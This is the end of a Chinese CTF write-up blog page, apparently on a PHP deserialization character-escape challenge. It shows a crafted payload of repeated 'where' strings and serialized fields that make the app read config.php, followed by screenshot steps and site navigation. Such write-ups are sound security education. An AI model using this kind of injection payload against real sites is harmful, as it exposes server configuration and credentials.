+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>&quot;;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;photo&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817203900289.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817203900289"></p>
+<p>上传成功，去访问profile.php</p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817204106098.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817204106098"></p>
+<hr>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817204134202.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817204134202"></p>
+<p>解码一下</p>
+<p><img   class="lazyload" data-original="/2021/08/17/2021/ctf/12/image-20210817204228388.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210817204228388"></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/08/17/2021/ctf/12/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;17&#x2F;2021&#x2F;ctf&#x2F;12&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;17&#x2F;2021&#x2F;ctf&#x2F;12&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/08/18/2021/ctf/13/"><i class="iconfont iconleft"></i>De1CTF 2019 SSRF Me</a>
+    <a href="/2021/08/08/2021/ctf/10/">安洵杯 2019 easy_web<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">0x00知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A3%80%E6%B5%8B"><span class="toc-text">参数传递数组绕过字符串检测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-text">反序列化字符逃逸</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">参考博客</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01%E8%A7%A3%E9%A2%98"><span class="toc-text">0x01解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%85%A7%E6%90%AC%E5%A4%A7%E4%BD%AC%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-text"> 照搬大佬思路：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-text">反序列化字符逃逸知识补充</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E7%BB%A7%E7%BB%AD"><span class="toc-text">解题继续</span></a></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
